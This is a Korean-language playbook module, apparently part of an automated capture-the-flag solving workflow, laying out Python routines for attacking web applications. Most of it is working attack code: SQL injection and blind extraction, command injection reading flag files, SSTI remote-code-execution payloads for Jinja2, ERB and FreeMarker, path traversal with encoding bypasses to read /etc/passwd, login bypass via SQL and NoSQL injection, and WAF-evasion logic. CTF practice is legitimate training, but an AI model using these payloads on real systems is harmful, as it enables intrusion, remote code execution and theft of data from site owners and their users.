# Step 2b: 일반 웹 취약점 공격

## 전제 조건
- 웹 애플리케이션 확인됨
- 엔드포인트와 파라미터 매핑 완료

## 목표
일반적인 웹 취약점을 체계적으로 테스트하여 플래그 획득

## 실행 프로세스

### 2b.1 취약점 우선순위 결정

```python
def prioritize_web_attacks(context):
    """컨텍스트 기반 공격 우선순위 설정"""
    
    priority_list = []
    
    # 데이터베이스 징후
    if any(db in context.technologies for db in ['mysql', 'postgres', 'sqlite']):
        priority_list.append('SQL_INJECTION')
    
    # 템플릿 엔진 사용
    if context.template_engine:
        priority_list.append('SSTI')
    
    # 파일 관련 기능
    if any(ep in context.endpoints for ep in ['/upload', '/download', '/file']):
        priority_list.append('PATH_TRAVERSAL')
    
    # 명령 실행 가능성
    if any(param in context.params for param in ['cmd', 'exec', 'command']):
        priority_list.append('COMMAND_INJECTION')
    
    # 기본 순서
    default_order = ['SQLi', 'CMDi', 'SSTI', 'XSS', 'XXE', 'LFI']
    
    # 우선순위 병합
    return priority_list + [x for x in default_order if x not in priority_list]
```

### 2b.2 SQL Injection

```python
def test_sql_injection(endpoint, params):
    """SQL 인젝션 체계적 테스트"""
    
    # 1. 탐지 페이로드
    detection_payloads = [
        "'",
        "' OR '1'='1",
        "1' AND '1'='2",
        "' OR SLEEP(5)--"
    ]
    
    vulnerable_param = None
    for param in params:
        for payload in detection_payloads:
            response = send_payload(endpoint, {param: payload})
            
            # 에러 기반 탐지
            if any(err in response for err in ['SQL', 'syntax', 'mysql', 'postgres']):
                vulnerable_param = param
                break
            
            # 시간 기반 탐지
            if 'SLEEP' in payload and response.time > 5:
                vulnerable_param = param
                break
    
    if not vulnerable_param:
        return None
    
    # 2. 익스플로잇 페이로드
    exploit_payloads = [
        f"' UNION SELECT * FROM flag--",
        f"' UNION SELECT table_name FROM information_schema.tables--",
        f"' OR EXISTS(SELECT * FROM flag)--",
        f"'; SELECT load_file('/flag.txt')--"
    ]
    
    for payload in exploit_payloads:
        result = send_payload(endpoint, {vulnerable_param: payload})
        if 'flag{' in result.lower():
            return extract_flag(result)
    
    # 3. Blind SQL Injection
    if vulnerable_param:
        return blind_sql_extraction(endpoint, vulnerable_param)
```

### 2b.3 Command Injection

```python
def test_command_injection(endpoint, params):
    """명령 주입 테스트"""
    
    # 1. 기본 탐지
    test_payloads = [
        "; echo vulnerable",
        "| echo vulnerable",
        "$(echo vulnerable)",
        "`echo vulnerable`"
    ]
    
    for param in params:
        for payload in test_payloads:
            response = send_payload(endpoint, {param: payload})
            if "vulnerable" in response:
                # 2. 플래그 추출
                flag_payloads = [
                    "; cat /flag.txt",
                    "| cat /flag.txt",
                    "$(cat /flag.txt)",
                    "`cat /flag.txt`",
                    "; cat /flag*",
                    "; find / -name flag* 2>/dev/null | xargs cat"
                ]
                
                for flag_payload in flag_payloads:
                    result = send_payload(endpoint, {param: flag_payload})
                    if 'flag{' in result.lower():
                        return extract_flag(result)
    
    return None
```

### 2b.4 Server-Side Template Injection (SSTI)

```python
def test_ssti(endpoint, params):
    """템플릿 인젝션 테스트"""
    
    # 1. 템플릿 엔진 탐지
    detection_payloads = {
        'generic': '{{7*7}}',
        'jinja2': '{{7*7}}',
        'erb': '<%= 7*7 %>',
        'freemarker': '${7*7}',
        'velocity': '#set($x=7*7)$x'
    }
    
    template_engine = None
    vulnerable_param = None
    
    for param in params:
        for engine, payload in detection_payloads.items():
            response = send_payload(endpoint, {param: payload})
            if '49' in response:
                template_engine = engine
                vulnerable_param = param
                break
    
    if not template_engine:
        return None
    
    # 2. 엔진별 RCE 페이로드
    rce_payloads = {
        'jinja2': "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
        'erb': "<%= `cat /flag.txt` %>",
        'freemarker': "${'cat /flag.txt'.execute()}",
        'generic': "{{system('cat /flag.txt')}}"
    }
    
    if template_engine in rce_payloads:
        result = send_payload(endpoint, {vulnerable_param: rce_payloads[template_engine]})
        if 'flag{' in result.lower():
            return extract_flag(result)
    
    return None
```

### 2b.5 Path Traversal / Local File Inclusion

```python
def test_path_traversal(endpoint, params):
    """경로 순회 및 파일 포함 테스트"""
    
    # 1. 다양한 인코딩과 우회 기법
    traversal_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/html/../../etc/passwd"
    ]
    
    # 2. 플래그 파일 시도
    flag_locations = [
        "../../../flag.txt",
        "../../../flag",
        "../../../home/flag.txt",
        "/flag.txt",
        "flag.txt"
    ]
    
    for param in params:
        # passwd 파일로 취약점 확인
        for payload in traversal_payloads:
            response = send_payload(endpoint, {param: payload})
            if 'root:' in response:
                # 취약점 확인됨, 플래그 추출
                for flag_path in flag_locations:
                    result = send_payload(endpoint, {param: flag_path})
                    if 'flag{' in result.lower():
                        return extract_flag(result)
    
    return None
```

### 2b.6 인증/세션 취약점

```python
def test_auth_bypass(context):
    """인증 우회 테스트"""
    
    # 1. 기본 우회 기법
    bypass_techniques = [
        # SQL Injection in login
        {"username": "admin' --", "password": "anything"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        
        # NoSQL Injection
        {"username": {"$ne": "null"}, "password": {"$ne": "null"}},
        
        # Unicode 정규화
        {"username": "ádmin", "password": "admin"},
        {"username": "ADMIN", "password": "admin"},
        
        # Type Juggling
        {"username": "admin", "password": True},
        {"username": "admin", "password": 0}
    ]
    
    login_endpoints = ['/login', '/auth', '/signin', '/api/login']
    
    for endpoint in login_endpoints:
        if endpoint in context.endpoints:
            for technique in bypass_techniques:
                response = send_payload(endpoint, technique, method='POST')
                if any(indicator in response for indicator in ['success', 'token', 'session', 'admin']):
                    return {"auth_bypassed": True, "session": extract_session(response)}
    
    return None
```

### 2b.7 응답 기반 적응

```python
def adapt_based_on_response(response, previous_payload):
    """응답 분석하여 페이로드 조정"""
    
    # WAF 감지
    if any(waf in response for waf in ['blocked', 'forbidden', 'detected']):
        return apply_waf_bypass(previous_payload)
    
    # 인코딩 문제
    if 'encoding' in response or 'charset' in response:
        return encode_payload_properly(previous_payload)
    
    # 길이 제한
    if 'too long' in response or 'length' in response:
        return shorten_payload(previous_payload)
    
    # 특정 문자 필터링
    if previous_payload not in response:
        filtered_chars = identify_filtered_chars(previous_payload, response)
        return bypass_char_filter(previous_payload, filtered_chars)
```

## 블라인드 공격 기법

```python
def blind_extraction(endpoint, param, injection_type):
    """블라인드 공격으로 데이터 추출"""
    
    flag = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}"
    
    for position in range(1, 50):
        for char in charset:
            if injection_type == "SQL":
                payload = f"' OR SUBSTRING((SELECT flag FROM flag),{position},1)='{char}'--"
            elif injection_type == "CMD":
                payload = f"; [ $(cat /flag.txt | cut -c{position}) = '{char}' ] && sleep 3"
            
            start_time = time.time()
            response = send_payload(endpoint, {param: payload})
            elapsed = time.time() - start_time
            
            if elapsed > 3:  # 시간 지연 확인
                flag += char
                print(f"[추출] 현재 플래그: {flag}")
                break
        
        if flag.endswith("}"):
            return flag
    
    return flag
```

## 출력 형식

### 성공 시
```json
{
  "module": "2b_web_attacks",
  "status": "SUCCESS",
  "vulnerability": "SQL Injection",
  "vulnerable_endpoint": "/login",
  "vulnerable_param": "username",
  "flag": "flag{...}",
  "payload_used": "' OR '1'='1"
}
```

### 진행 중
```json
{
  "module": "2b_web_attacks",
  "status": "IN_PROGRESS",
  "current_test": "SSTI",
  "tested": ["SQLi", "CMDi"],
  "partial_success": "Template engine detected",
  "next": "Trying RCE payloads"
}
```

## 핵심 원칙

1. **체계적 접근**: 우선순위에 따른 순차 테스트
2. **깊이 있는 테스트**: 취약점 발견 시 완전 익스플로잇까지
3. **응답 분석**: 모든 응답에서 힌트 추출
4. **우회 기법**: 필터링 감지 시 다양한 우회 시도
5. **효율성**: 취약점 없음이 명확하면 빠른 전환
